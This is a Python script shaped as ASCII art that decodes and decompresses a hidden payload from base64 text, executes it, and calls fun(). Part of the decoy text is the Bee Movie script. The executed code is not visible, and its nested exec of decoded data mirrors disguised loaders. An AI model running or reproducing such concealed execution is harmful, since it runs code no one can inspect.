#!/usr/bin/env python3
import base64
magic = """
eJxlkMlOwzAQhu88xdBLHKiiEprSIvVCCUvpoqhARQ9Ijj1JTLPJdhDh6XHa0rLMxcvM9/8zwzGCqMq
JfXkEJtZYwxBCy5v47tj3nm+m41l/dTuaDebBJLgLXi7G/nT0dG9tqkvK1sgNYPE4OF3UfZfG63q8mA
5WdSebXt0s54/B6Vz4g9ky9h7e+h+T62BoHW1gbpwxZ7Iu.....9Rl5p7LdmO/aaEKirmQOYa1REQqv
EEJUSKBtcxE5fIryQNlbyVKKXJPWHaZpAY8JSjx..............u2T8z9xHURQWM5qAqxlCpqErTG
mLUoBMEVVSSIRSReQllqCKWNGvvoe86..............49ko......b6QzM39CVZKK0FEJdb0e2Xoq
ZCa1H9EwpnWqsNd1wl6XIys4..............ku0K7S2ROVXJqU.....Zi0L8/WhJJc15kTnM003Ta
7sm5a9uOsWikLKqY..............ENbvZRwMd1WZk+AHFzEqTf6j.....zq6tg9YXB7ikxA==_ _ 
_QWNjb3JkaW5n..........IHRvIGFsbCBrbm93biBsYXdzIG9mIGF2a.....WF0aW9uLCB0aGVyZSB
pcyBubyB3YXk.....gdGhhdCBhYmVlIHNob3VsZCBiZSBhYmxlIHRvIGZs.....eS4gSXRzIHdpbmdz
IGFyZSB0b28g....c21hbGwgdG8gZ2V0IGl0cyBmYXQgbGl0....dGxlIGJv.....ZHlvZmYgdGhlIG
dyb3VuZC4gV....GhlIGJlZSwgb2YgY291cnNlLCBmbGllcy.....Bhbnl3YXk.....uIEJlY2F1c2U
gYmVlcyBkb2....50IGNhcmUgd.............2hhdGh1bW.....FucyB0aGlua.....yBpcyBpbXB
vc3NpYmxlL....iBTRVEuID...................c1IC0gS.....U5UUk8gVE8gQ.....kFSUlkgS
U5ULiBCRU5...TT04gSE9......VU0UgLSBEQ......VlBTkdM....RSBPTjogU25lYW.....tlcnMg
b24gdGhlI....Gdyb3Vu.....ZC4gQ2FtZXJhIF.....BBTlMg.....VVAgdG8gcmV2ZWF.....sIEJ
BUlJZIEJF...TlNPTlN.....CRURS....T09NIEF....OR0xFIE.....9OOiBCYXJyeXMgaG....FuZ
CBmbGlwc....GluZyB.....0aHJvd.....WdoIGRpZmZlcmVudC.....Bzd2VhdGVycyBpbi....Boa
XNjbG9zZ...XQuIEJB.....UlJZIF.....llbGxvdyBibGFjay.......wgeWVsbG93IGJs....YWNr
LCB5ZWx....sb3cgYm.....xhY2ssI.....HllbGxvd..............yBibGFjaywgeWV....sbG9
3YmxhY....2ssIHllbG....xvdyBib............................GFjay4uLm9va....GgsIG
JsYWNr....IGFuZCB5Z.....Wxsb3cu..............Li4gQU5H.....TEUgT046IEJh...cnJ5IH
dlYXJ....pbmcgdGhlc3.....dlYXRlc......iBoZSBwaWNrZWQsI.....Gxvb2tpbmc....gaW4gd
GhlIG....1pcnJvci4gQ.....kFSUlkg.....KENPTlREKSBZZWFoL.....CBsZXRzIHN...oYWtlIG
l0IH....VwYSBsaXR0bGU.....uIEhlIH.....BpY2tzI....HRoZSB.....ibGFjayB....hbmQgeW
VsbG....93IG9uZS4gSGU.....gdGhlbi.....Bnb2VzI....HRvIHR.....oZSBzaW5...rLCB0YWt
lcyB0.....aGV0b3Agb2Zm.....IGEgQ09.....OVEFJT....kVSIE9G.....IEhPTk....VZLCBhbm
QgcHV0c.....yBzb21lIGhv.....bmV5IG.....ludG8.....gaGlzIGh....haXIu....IEhlIHNxd
WlydHMgc2.....9tZWluIGhp.....cyBtb3V0aCBhb......mQgZ2FyZ2xlcy4gVGh....lbiBoZSB0
YWtlcyB0aGU.....gbGlkIG9m.......ZiB0aGU........gYm90dGxlLCBhbmQgc....m9sbHMgc29
tZW9uIGxpa2Ug.....ZGVvZG9yY.................W50LiBDVVQgVE86IElOVC....4gQkVOU09O
IEhPVVNFIEtJVEN.....IRU4gLSBDT.........05USU5VT1VTIEJhcnJ5J3Ntb3....RoZXIsIEpBT
kVUIEJFTlNPTiwgeW.....VsbHMgdXAgYXQgQmFycnkuIEpBTkVUIEJFTlNPTiB....CYXJyeSwgYnJ
lYWtmYXN0IGlzIHJlYW.....R5IUNVVCBUTzogIkJlZSBNb3ZpZSIgLSBK.........UyBSRVZJU0lP
TlMgOC8xMy8wNyAxLiBJT.....lQuIEJBUlJZJ1MgUk9PTSAtI..............ENPTlRJTlVPVVNC
QVJSWSBDb21pbmchIFNGWDo.....gUGhvbmUgUklOR0..............lORy4gQmFycnlzIGFudGVu
bmFlIHZpYnJhdGUgYXMgdGhle.....SBSSU..............5HIGxpa2UgYXBob25lLiBCYXJyeXMg
aGFuZHMgYXJlIHdldC4gSGUgbG9...............va3MgYXJvdW5kIGZvciBhIHRvd2VsLiBCQVJS
WSAoQ09OVEQpIEhhbmdvbiBhIHNlY.....29uZCEgSGUgd2lwZXMgaGlzIGhhbmRzIG9uIGhpcyBzd2
VhdGVyLCBhbmQgcHVsbHMgaGlzIGFudGVubmFlIGRvd24gdG9oaXMgZWFyIGFuZCBtb3V0aC4gQkFSU
lkgKENPTlQnRCkgSGVsbG8/IEhpcyBiZXN0IGZyaWVuZCwgQURBTSBGTEFZTUFOLCBpcyBvbnRoZSBv
dGhlciBlbmQuIEFEQU0gQmFycnk/IEJBUlJZIEFkYW0/IEFEQU0gQ2FuIHlvdSBiZWxpZXZlIHRoaXM

"""

exec(base64.b64decode("CmltcG9ydCByYW5kb20KaW1wb3J0IGhhc2hsaWIKaW1wb3J0IHpsaWIKZXhlYyh6bGliLmRlY29tcHJlc3MoYmFzZTY0LmI2NGRlY29kZSgnJy5qb2luKG1hZ2ljLnJlcGxhY2UoJy4nLCcnKS5zcGxpdCgnXG4nKSkuc3BsaXQoJ18gXyBfJylbMF0pKSkKZnVuKCkK"))

